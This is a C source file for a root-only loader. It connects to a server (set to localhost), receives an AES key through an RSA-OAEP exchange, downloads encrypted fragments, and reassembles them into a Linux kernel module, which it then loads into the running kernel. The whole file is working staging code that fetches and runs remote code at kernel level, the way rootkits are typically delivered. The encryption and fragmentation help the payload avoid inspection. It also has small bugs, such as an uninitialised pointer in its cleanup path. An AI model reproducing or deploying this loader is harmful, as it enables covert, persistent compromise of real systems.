#include <openssl/evp.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/fraction.h"
#include "../include/http.h"
#include "../include/load.h"
#include "../include/log.h"
#include "../include/sock.h"
#include "../include/utils.h"

/* server address */
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "8000"

static void cleanup_fraction_array(fraction_t *array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    fraction_free(&array[i]);
  }
  free(array);
}

static int do_connect(void) {
  struct addrinfo hints, *ainfo;
  int sfd;

  setup_hints(&hints);

  if (h_getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &ainfo) != 0) {
    log_error("Failed to resolve server address");
    return -1;
  }

  printf("Connecting to: %s:%s\n", SERVER_IP, SERVER_PORT);
  sfd = create_sock_and_conn(ainfo);
  if (sfd == -1) {
    log_error("Failed to create socket and connect");
    return -1;
  }
  freeaddrinfo(ainfo);

  return sfd;
}

static uint8_t *get_aes_key(int sfd, size_t *key_length) {
  EVP_PKEY *pkey = NULL;
  char *public_key = NULL;

  http_res_t http_post_res = {0};

  unsigned char *b64_decoded_aes_key;
  unsigned char *aes_key = NULL;
  size_t key_len = 0;

  pkey = generate_rsa_private_key();
  if (pkey == NULL) {
    return NULL;
  }

  public_key = write_rsa_public_key(pkey);
  if (public_key == NULL) {
    EVP_PKEY_free(pkey);
    return NULL;
  }

  /* Receive and decrypt AES key from server */
  if (http_post(sfd, "/", "application/octect-stream", public_key,
                &http_post_res) != HTTP_SUCCESS) {
    log_error("Failed to send RSA public key");
    free(public_key);
    EVP_PKEY_free(pkey);
    return NULL;
  }

  log_info("Base64 encoded key: %s", http_post_res.data);
  base64_decode(http_post_res.data, &b64_decoded_aes_key, &key_len);
  log_info("Key size (decoded): %zu", key_len);

  aes_key = decrypt_rsa_oaep_evp(pkey, b64_decoded_aes_key, key_len, &key_len);
  if (aes_key == NULL) {
    log_error("Failed to decrypt data from server");
    free(b64_decoded_aes_key);
    http_free(&http_post_res);
    free(public_key);
    EVP_PKEY_free(pkey);
    return NULL;
  }

  free(b64_decoded_aes_key);
  http_free(&http_post_res);
  free(public_key);
  EVP_PKEY_free(pkey);

  *key_length = key_len;
  return aes_key;
}

static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
  http_res_t http_fraction_res = {0};

  fraction_t *fractions = NULL;
  char fraction_url[50];
  int i, num_fractions;

  snprintf(fraction_url, 50, "http://%s:%s/stream", SERVER_IP, SERVER_PORT);

  if (http_get(sfd, "/size", &http_fraction_res) != HTTP_SUCCESS) {
    log_error("Failed to retrieve fraction links");
  }

  log_debug("Retrieved fraction links");

  num_fractions = atoi(http_fraction_res.data);
  log_debug("Fetching %d fractions", num_fractions);

  fractions = calloc(num_fractions, sizeof(fraction_t));
  if (!fractions) {
    log_error("Failed to allocate memory for fractions");
    http_free(&http_fraction_res);
    return NULL;
  }
  
  i = 0;
  while (i < num_fractions) {
    log_debug("Downloading fraction no.%d", i);

    if (download_fraction(sfd, fraction_url, &fractions[i]) != 0) {
      log_error("Failed to download fraction");

      // we have to cleanup only until i because the other fractions have not
      // been initialized anyhow
      http_free(&http_fraction_res);
      cleanup_fraction_array(fractions, i);
      return NULL;
    }

    i++;
  }

  http_free(&http_fraction_res);
  *fraction_count = i;
  return fractions;
}

int main(void) {
  int sfd = -1; // to be extra professional

  unsigned char *aes_key = NULL;
  size_t key_len = 0;

  fraction_t *fractions;
  int fraction_count;

  uint8_t *module = NULL;
  ssize_t module_size;

  /* We need root permissions to load LKMs */
  if (geteuid() != 0) {
    log_error("This program needs to be run as root!");
    exit(1);
  }

  /* initialize PRNG and set logging level */
  init_random();
  log_set_level(LOG_DEBUG);

  /* open a connection to the server */
  sfd = do_connect();
  if (sfd < 0) {
    goto cleanup;
  }

  /* receive the AES key */
  aes_key = get_aes_key(sfd, &key_len);
  if (aes_key == NULL) {
    goto cleanup;
  }

  /* download and sort the fractions*/
  fractions = fetch_fractions(sfd, &fraction_count);
  if (fractions == NULL) {
    goto cleanup;
  }
  qsort(fractions, fraction_count, sizeof(fraction_t), compare_fractions);
  log_info("Downloaded fractions");

  /* decrypt the fractions and assemble the LKM */
  module = decrypt_lkm(fractions, fraction_count, &module_size, aes_key);
  if (module == NULL) {
    log_error("There was an error creating the module");
    cleanup_fraction_array(fractions, fraction_count);
    goto cleanup;
  }

  /* load the LKM in the kernel */
  if (load_lkm(module, module_size) < 0) {
    log_error("Error loading LKM");
    goto cleanup;
  }

  /* cleanup */
  close(sfd);
  cleanup_fraction_array(fractions, fraction_count);
  free(module);
  free(aes_key);

  return EXIT_SUCCESS; // hooray!!!

  /* Encapsulate cleanup */
cleanup:
  if (sfd != -1) close(sfd);
  if (fractions) cleanup_fraction_array(fractions, fraction_count);

  free(module);
  free(aes_key);

  return EXIT_FAILURE;

}
